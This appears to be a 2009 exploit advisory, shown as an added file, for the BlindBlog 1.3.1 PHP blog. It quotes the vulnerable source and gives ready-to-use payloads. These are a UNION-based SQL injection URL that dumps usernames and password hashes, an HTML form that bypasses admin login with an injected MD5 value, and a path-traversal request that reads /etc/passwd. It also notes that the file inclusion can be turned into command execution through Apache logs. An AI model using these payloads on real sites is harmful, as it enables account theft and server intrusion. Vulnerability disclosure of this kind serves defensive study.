@@ -1,0 +1,133 @@
+*******   Salvatore "drosophila" Fresta   *******
+
+[+] Application: BlindBlog
+[+] Version: 1.3.1
+[+] Website: http://sourceforge.net/projects/cbblog/
+
+[+] Bugs: [A] SQL Injection
+         [B] Authentication Bypass
+         [C] Local File Inclusion
+
+[+] Exploitation: Remote
+[+] Date: 03 Mar 2009
+
+[+] Discovered by: Salvatore "drosophila" Fresta
+[+] Author: Salvatore "drosophila" Fresta
+[+] Contact: e-mail: drosophilaxxx@gmail.com
+
+
+*************************************************
+
+[+] Menu
+
+1) Bugs
+2) Code
+3) Fix
+
+
+*************************************************
+
+[+] Bugs
+
+
+- [A] SQL Injection
+
+[-] Requisites: magic_quotes_gpc = off
+[-] File affected: comment.php
+
+All queries are vulnerable.
+This bug allows a guest to view username and the
+password of a registered user.
+
+$id = (isset($_GET['id']) && $_GET['id'] !='') ?  $_GET['id'] : getlastid();
+
+       $SQL = "SELECT comment,author,contact,date FROM `cblog_comments`
+WHERE `pid` = '$id' ORDER BY `cid` DESC";
+       $resulted = $db->query($SQL, $querys);
+       while ($result = mysql_fetch_assoc($resulted))
+               $comments[] = $result;
+
+
+- [B] Authentication Bypass
+
+[-] Requisites: magic_quotes_gpc = off
+[-] File affected: admin.login.php
+
+       $username = $_POST['username'];
+       $password = md5($_POST['password']);
+       include('./db_config.php');
+       $db = new db_stuff;
+       $db->connect();
+       $result = $db->query("SELECT * FROM `cblog_users` WHERE `username` =
+'$username'", $querys);
+       if (mysql_num_rows($result) > 1 || mysql_num_rows($result) < 1)
+       {
+               echo "Incorrect username";
+               exit;
+       }
+       $result = mysql_fetch_assoc($result);
+       if ($result['password'] !== $password)
+       {
+               echo 'Incorrect Password';
+               exit;
+       }
+
+
+- [C] Local File Inclusion
+
+[-] Requisites: none
+[-] File affected: admin.php
+
+This bug allow an admin to include local files.
+It is possible bypass authentication using the
+previous bug.
+With this bug is possible to execute remote
+commands using Apache logs.
+
+...
+} else if (isset($_GET['act']) && $_SESSION['is_admin'])
+{
+       $loc = 'admin.'.$_GET['act'].'.php';
+       include('./'.$loc);
+}
+...
+
+
+*************************************************
+
+[+] Code
+
+
+- [A] SQL Injection
+
+http://www.site.com/path/comment.php?id=-1' UNION ALL SELECT
+NULL,CONCAT(username, char(58), password),3,4 FROM cblog_users%23
+
+
+- [B] Authentication Bypass
+
+<html>
+       <head>
+               <title>BlindBlog 1.3.1 Authentication Bypass Exploit</title>
+       </head>
+       <body>
+               <form
+action="http://www.site.com/path/admin/admin.login.php?go=1"
+method="POST">
+                       <input type="hidden" name="username" value="-1'
+UNION ALL SELECT
+1,'admin',MD5('expl')#">
+                       <input type="hidden" name="password" value="expl">
+                       <input type="submit" value="Exploit">
+               </form>
+       </body>
+</html>
+
+
+- [C] Local File Inclusion
+
+Tested on MAC OSX: /Applications/xampp/xamppfiles/htdocs/cbblog/admin/admin.php
+
+http://www.site.com/path/admin/admin.php?act=/../../../../../../../etc/passwd%00
+
+# milw0rm.com [2009-03-03]
